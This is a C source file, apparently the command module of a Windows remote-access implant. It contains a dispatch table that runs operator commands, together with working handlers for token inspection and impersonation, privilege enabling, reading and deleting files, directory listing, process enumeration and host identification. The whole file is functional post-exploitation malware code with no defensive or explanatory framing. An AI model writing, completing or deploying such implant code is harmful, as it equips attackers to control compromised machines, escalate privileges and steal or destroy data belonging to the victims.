#include "command.h"
#include <tlhelp32.h>

#define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U

CONST COMMAND_MAP G_CommandTable[] = {
	{ CMD_KILL,               CmdKillImplant },
	{ CMD_INSPECT_TOKEN,      CmdCurrentToken },
	{ CMD_PROCESS_TOKEN,      CmdProcessToken },
	{ CMD_TOKEN_PRIVILEGES,   CmdTokenPrivileges },
	{ CMD_TOKEN_IMPERSONATE,  CmdImpersonateToken },
	{ CMD_ENABLE_PRIVILEGE,   CmdEnablePrivilege },
	{ CMD_LS,                 CmdLs },
	{ CMD_CAT,                CmdCat },
	{ CMD_MKDIR,              CmdMkdir },
	{ CMD_RM,                 CmdRm },
	{ CMD_PS,                 CmdPs },
	{ CMD_HOSTNAME,           CmdHostname },
	{ CMD_GETPID,             CmdGetPid }
};

static DWORD ConvertUtf8ToWideString(
	DWORD dataLen,
	CONST PBYTE data,
	PWSTR* wideString
)
{
	INT wideCharCount = 0;
	PWSTR buffer = NULL;

	ASSERT(wideString != NULL);

	*wideString = NULL;
	if (data == NULL || dataLen == 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	wideCharCount = MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		NULL,
		0
	);
	if (wideCharCount <= 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	buffer = (PWSTR)ImplantHeapAlloc(
		((SIZE_T)wideCharCount + UTF8_WIDE_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR)
	);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		buffer,
		wideCharCount
	) <= 0)
	{
		ImplantHeapFree(buffer);
		return ERROR_INVALID_REQUEST;
	}

	buffer[wideCharCount] = L'\0';
	*wideString = buffer;
	return NO_ERROR;
}

DWORD CmdKillImplant(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	*responseData = NULL;
	*responseLen = 0;
	RequestImplantTermination();

	return NO_ERROR;
}

DWORD CmdCurrentToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD CmdProcessToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
}

DWORD CmdTokenPrivileges(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
}

DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;
	return ImpersonateProcessToken(processId, responseData, responseLen);
}

DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = EnableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
	ImplantHeapFree(privilegeName);
	return status;
}

DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	for (DWORD i = 0; i < ARRAYSIZE(G_CommandTable); i++)
	{
		if ((DWORD)G_CommandTable[i].id == cmdId)
		{
			return G_CommandTable[i].handler(
				dataLen,
				data,
				responseData,
				responseLen
			);
		}
	}

	return ERROR_UNKNOWN_COMMAND;
}

DWORD CmdLs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ListDirectory(path, responseData, responseLen);
	ImplantHeapFree(path);
	return status;
}

DWORD CmdCat(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = ReadFileContents(path, responseData, responseLen);
	ImplantHeapFree(path);
	return status;
}

DWORD CmdMkdir(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;
	PBYTE buffer = NULL;
	DWORD pathBytes = 0;
	DWORD totalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = CreateDirectory_(path);

	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + pathBytes;

	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		ImplantHeapFree(path);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = status;
	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
	ImplantHeapFree(path);

	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

DWORD CmdRm(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR path = NULL;
	PBYTE buffer = NULL;
	DWORD pathBytes = 0;
	DWORD totalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	status = ConvertUtf8ToWideString(dataLen, data, &path);
	if (status != NO_ERROR)
	{
		return status;
	}

	status = DeletePath(path);

	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + pathBytes;

	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		ImplantHeapFree(path);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = status;
	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
	ImplantHeapFree(path);

	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

DWORD CmdPs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	HANDLE snapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W entry;
	DWORD entryCount = 0;
	DWORD bufferSize = sizeof(DWORD);
	DWORD offset = 0;
	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	entry.dwSize = sizeof(PROCESSENTRY32W);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		return ERROR_LIST_PROCESSES_FAILED;
	}

	if (Process32FirstW(snapshot, &entry))
	{
		do
		{
			DWORD nameBytes =
				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);
			bufferSize += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
			entryCount++;
		}
		while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);
	snapshot = INVALID_HANDLE_VALUE;

	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)(buffer + offset) = entryCount;
	offset += sizeof(DWORD);

	entry.dwSize = sizeof(PROCESSENTRY32W);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
	{
		ImplantHeapFree(buffer);
		return ERROR_LIST_PROCESSES_FAILED;
	}

	if (Process32FirstW(snapshot, &entry))
	{
		do
		{
			DWORD nameBytes =
				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);

			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > bufferSize)
			{
				break;
			}

			*(DWORD*)(buffer + offset) = entry.th32ProcessID;
			offset += sizeof(DWORD);

			*(DWORD*)(buffer + offset) = nameBytes;
			offset += sizeof(DWORD);

			CopyMemory(buffer + offset, entry.szExeFile, nameBytes);
			offset += nameBytes;
		}
		while (Process32NextW(snapshot, &entry));
	}

	CloseHandle(snapshot);

	*responseData = buffer;
	*responseLen = offset;
	return NO_ERROR;
}

DWORD CmdHostname(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	WCHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD nameLen = MAX_COMPUTERNAME_LENGTH + 1;
	DWORD nameBytes = 0;
	DWORD totalLength = 0;
	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	if (!GetComputerNameW(hostName, &nameLen))
	{
		return ERROR_GET_HOSTNAME_FAILED;
	}

	nameBytes = (nameLen + 1) * sizeof(WCHAR);
	totalLength = sizeof(DWORD) + nameBytes;

	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = nameBytes;
	CopyMemory(buffer + sizeof(DWORD), hostName, nameBytes);

	*responseData = buffer;
	*responseLen = totalLength;
	return NO_ERROR;
}

DWORD CmdGetPid(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	buffer = (PBYTE)ImplantHeapAlloc(sizeof(DWORD));
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)buffer = GetCurrentProcessId();

	*responseData = buffer;
	*responseLen = sizeof(DWORD);
	return NO_ERROR;
}